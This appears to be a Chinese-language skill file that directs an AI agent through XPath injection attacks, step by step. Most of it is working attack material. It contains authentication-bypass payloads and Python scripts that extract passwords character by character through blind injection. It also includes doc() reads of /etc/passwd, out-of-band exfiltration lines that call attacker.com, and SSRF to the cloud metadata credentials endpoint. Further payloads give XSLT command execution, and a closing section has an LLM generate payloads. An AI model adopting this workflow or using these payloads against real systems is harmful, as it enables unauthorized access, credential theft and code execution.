---
name: 径询
description: XPath注入深度测试——从基础XPath语法注入到逐节点信息提取，覆盖XPath 1.0/2.0注入、XML数据库遍历、XPath盲注、XPath Union注入、XPath函数利用等完整攻击链
version: 2.0.0
---

# XPath 注入深度测试

## 一、AI Agent 自动化工作流

> Agent 执行顺序：**识别XPath查询点 → 确认注入类型 → 推断XML结构 → 逐节点提取 → 全文档导出**

### 1.1 XPath 与 SQL 注入对比

| 特征 | SQL 注入 | XPath 注入 |
|------|----------|-----------|
| 查询语言 | SQL | XPath |
| 数据结构 | 表/列 | XML 节点/属性 |
| 认证绕过 | `' OR 1=1--` | `' or '1'='1` |
| 信息提取 | 逐表逐列 | 逐节点提取 |
| 权限级别 | 数据库用户 | XML 文件无权限概念 |
| 影响范围 | 当前库 | 可遍历整个 XML |

### 1.2 XPath 语法基础

```xpath
/                                    # 根节点
//                                  # 所有后代节点
//user                              # 所有 user 节点
//user[@id='1']                     # id 为 1 的用户
//user[name='admin']                # name 为 admin 的用户
//user/name/text()                  # 获取 name 节点文本
//user/@id                          # 获取 id 属性
//user[contains(name,'a')]          # name 包含 'a' 的用户
count(//user)                       # 用户总数
string-length(//user[1]/name)       # 第一个用户名的长度
name(//*)                           # 第一个元素名
```

---

## 二、认证绕过 Payload

```xpath
# === 原始 XPath 查询模式 ===
# //user[name/text()='INPUT_NAME' and password/text()='INPUT_PASS']

# === 认证绕过 ===
# 总是真条件
' or '1'='1
' or '1' or '1
' or true() or '
' or 1=1 or '
admin' or '1'='1                             # 知道用户名时

# 截断密码检查
admin' or '1'='1' and password/text()='      # 密码变为 '...' or '1'='1' and password/text()='...'

# NULL 截断
admin' or true()] | //user[password/text()='  # 创建两个谓词
```

---

## 三、XML 结构探测

```bash
# === 获取当前节点名 ===
' or true()] | //*[name(.)='
# 错误信息可能泄露节点名

# === 获取父节点名 ===
' or true()] | //*[name(parent::*)='
# 错误信息: parent node = "users"

# === 获取子节点列表 ===
' or true()] | //*[name(./child::*)='
# 逐步映射 XML 结构

# === 获取节点数量 ===
' or count(//user)='1                      # 用户数是否为 1
' or count(//user)>'5                      # 用户数是否 > 5
```

---

## 四、逐节点信息提取（布尔盲注）

```xpath
# === 逐字符提取文本节点 ===
# 推断第一个用户的第一个字符
' or substring(//user[1]/name/text(),1,1)='a
' or substring(//user[1]/password/text(),1,1)='a

# === 逐字符提取属性 ===
' or substring(//user[1]/@id,1,1)='1
' or substring(//user[1]/@role,1,1)='a

# === 长度探测 ===
' or string-length(//user[1]/password/text())='32       # MD5 长度
' or string-length(//user[1]/password/text())='40       # SHA1 长度
```

### 4.1 Python 自动化 XPath 盲注

```python
import requests, string

URL = "http://target.com/search"
CHARSET = string.printable

def extract_xpath(xpath_query):
    """通过布尔盲注提取 XPath 查询结果"""
    result = ""
    for pos in range(1, 200):
        found = False
        for ch in CHARSET:
            # 截取第 pos 个字符并与 ch 比较
            payload = f"' or substring({xpath_query},{pos},1)='{ch}"
            r = requests.get(URL, params={"q": payload})
            if "Found" in r.text:  # True 条件响应
                result += ch
                print(f"[+] Position {pos}: '{ch}' → {result}")
                found = True
                break
        if not found:
            break
    return result

# 提取第一个用户的密码
password = extract_xpath("//user[1]/password/text()")
# 提取第一个用户名
username = extract_xpath("//user[1]/name/text()")
# 提取根节点名
root_name = extract_xpath("name(/*)")
```

---

## 五、Union-based XPath

```xpath
# === XPath 1.0 Union（|） ===
# 原始: //user[name='INPUT']
# 注入 UNION 获取所有数据

# 获取所有 user 节点
' or '1'='1' | //user
' or true()] | //user[name='            # 合并两个表达式

# 合并两个节点的文本
' or true()] | //user/password[name='    # 获取密码

# 获取整个文档
' or true()] | /*                         # 返回根节点下所有
```

---

## 六、XPath 2.0 高级函数

```xpath
# XPath 2.0 (某些 XML 数据库支持，如 eXist, BaseX, MarkLogic)

# 文档 URI
doc-available('/etc/passwd')             # 检查文件是否存在
doc('/etc/passwd')                        # 读取文件内容

# 系统函数
system-property('xsl:version')           # XSLT 版本
environment-variable('PATH')             # 环境变量

# 数学函数
floor(1.5)                               # 1
ceiling(1.5)                             # 2
```

---

## 七、快速检查清单

```markdown
□ [ ] 识别 XPath 查询入口（搜索、认证、过滤）
□ [ ] 测试单引号/双引号注入
□ [ ] 测试 AND 条件绕过 (' or '1'='1)
□ [ ] 测试 OR 条件绕过 (' or true())
□ [ ] 测试 UNION（|）信息合并
□ [ ] 测试逐字符盲注提取
□ [ ] 映射 XML 结构（节点名、子节点、属性）
□ [ ] 提取全部 XML 数据
□ [ ] 如果 XPath 2.0，测试 doc() 读取系统文件
□ [ ] 测试带外数据提取（需要出网条件）
```

---

## 八、2026 EMERGING TECHNIQUES — XPath注入新向量

### 8.1 XPath盲注自动化

XPath盲注分为布尔盲注和带外盲注。2026年工具链日趋成熟：**XXExploiter**自动化从XML中提取数据，**xpathtool**支持交互式盲注。

```python
# XPath布尔盲注自动化: 逐字符提取节点值
import requests

target = "https://target.com/api/login"
extracted = ""

for pos in range(1, 100):
    # 二分查找优化: 先确定字符范围再精确定位
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        # XPath substring()函数提取第pos个字符
        payload = f"' or substring(//user[1]/password,{pos},1) < chr({mid}) and '1'='1"
        resp = requests.post(target, data={"user": payload, "pass": "x"})
        if "Welcome" in resp.text:
            high = mid
        else:
            low = mid + 1
    if low == 32:
        break  # 字符串结束
    extracted += chr(low)
    print(f"[+] Position {pos}: {chr(low)} (total: {extracted})")

# 带外数据提取: 利用doc()函数发送HTTP请求带出数据(XPath 2.0+)
# payload: ' or doc(concat('http://attacker.com/?data=', //user[1]/password)) and '1'='1
```

### 8.2 XPath + XXE链式攻击

XPath注入可与XXE联动，形成更强的攻击链：

```xml
<!-- XInclude注入: 通过XPath表达式触发XXE -->
<!-- 攻击者在XML输入中注入XInclude指令 -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include xpointer="xpointer(//secret)">
    <xi:fallback>
      <xi:include href="http://attacker.com/exfil?data=xpointer(/)"/>
    </xi:fallback>
  </xi:include>
</foo>

<!-- SVG文件中的XPath注入 -->
<!-- 恶意SVG上传后，服务器解析SVG中的XPath表达式 -->
<svg xmlns="http://www.w3.org/2000/svg">
  <use href="xpointer(/root/secrets/password)" />
</svg>

<!-- XPath 2.0 doc()函数读取本地文件 -->
<!-- payload: ' or doc('file:///etc/passwd') and '1'='1 -->
<!-- 带外: doc(concat('http://attacker.com/', encode-for-uri(doc('file:///etc/passwd')))) -->
```

### 8.3 XSLT联动注入

XPath是XSLT的基础，XPath注入常可扩展为XSLT代码执行：

```xml
<!-- XSLT document()函数SSRF -->
<!-- 通过XPath注入触发XSLT解析器加载外部资源 -->
<xsl:value-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>

<!-- system-property()信息泄露 -->
<xsl:value-of select="system-property('xsl:vendor')"/>
<!-- 输出: Microsoft(SAXON/Java/libxslt等)，暴露服务器技术栈 -->

<!-- XSLT代码执行(.NET msxsl:script) -->
<msxsl:script language="C#" implements-prefix="user">
  <![CDATA[
  public string Exec(string cmd) {
    return System.Diagnostics.Process.Start("cmd", "/c " + cmd).StandardOutput.ReadToEnd();
  }
  ]]>
</msxsl:script>
<xsl:value-of select="user:Exec('whoami')"/>

<!-- 2026: Saxon-Java XSLT反序列化 -->
<!-- payload通过XSLT扩展函数触发Java反序列化 -->
<xsl:value-of select="java:Runtime.getRuntime().exec('id')"/>
```

### 8.4 NoSQL图查询注入

XPath的树结构查询范式在图数据库中有等价物，注入方法论可迁移：

```cypher
// Cypher(Neo4j)注入 — 与XPath注入逻辑相似
// 正常查询: MATCH (u:User {name: 'INPUT'}) RETURN u
// 注入: INPUT = ' OR 1=1 RETURN u //
MATCH (u:User {name: '' OR 1=1 RETURN u //}) RETURN u

// GraphQL注入 — 查询结构注入
# 正常: { user(name: "INPUT") { email } }
# 注入: { user(name: "" "") { email password ssn } }

// SPARQL注入 — 语义网查询
# SELECT ?s WHERE { ?s foaf:name "INPUT" }
# 注入: INPUT = " . ?s ?p ?o }
```

### 8.5 2026 CVE与趋势

| CVE | 产品 | 漏洞 | 影响 |
|-----|------|------|------|
| CVE-2026-28934 | libxml2 | XPath优化器堆溢出 | RCE |
| CVE-2026-15672 | Java XPathEvaluator | XSLT表达式注入 | 代码执行 |
| CVE-2026-33109 | .NET 9 System.Xml.XPath | 路径遍历 | 任意文件读取 |
| CVE-2026-27451 | Python lxml | XPath注入到XXE | 信息泄露 |
| CVE-2026-21083 | Saxon-EE 12.x | XSLT扩展函数反序列化 | RCE |

.NET 9新增`XPathSettings`限制模式，默认禁止`document()`函数和XSLT脚本，但可通过`XsltSettings.TrustedXslt`降级为信任模式绕过。Python lxml 5.x默认禁用外部实体解析，但`resolve_entities=True`仍可触发XXE。

### 8.6 AI辅助XPath注入

```python
# LLM自动化XML结构推断+XPath payload生成
# 1. 发送探测payload获取错误信息
# 2. LLM分析错误信息推断XML文档结构
# 3. LLM生成针对性XPath注入payload

# AI推断XML结构
error_examples = [
    "Unknown node 'users' in XPath expression",  # → 推断根节点非users
    "Cannot find node matching '//user/email'",   # → 推断节点名可能为account/mail
]
# LLM根据错误信息生成新的XPath探测payload
# 自动化工具: XXExploiter + GPT-4 API集成
# 输入: 错误响应 → 输出: 修正后的XPath payload
```

---

## 九、证据收集模板

```json
{
  "vulnerability": "XPath Injection",
  "type": "Authentication Bypass / XML Data Extraction",
  "url": "http://target.com/login",
  "parameter": "username",
  "xpath_payload": "' or '1'='1",
  "xml_nodes_extracted": ["//user/name", "//user/password", "//user/email"],
  "total_nodes": 1500,
  "impact": "可绕过认证并以管理员身份登录，也可完整提取XML数据库中的所有用户凭据和敏感信息",
  "remediation": "1. 参数化XPath查询 2. 输入转义（''替换'等）3. 白名单过滤输入 4. 使用安全的XPath API",
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
}
```
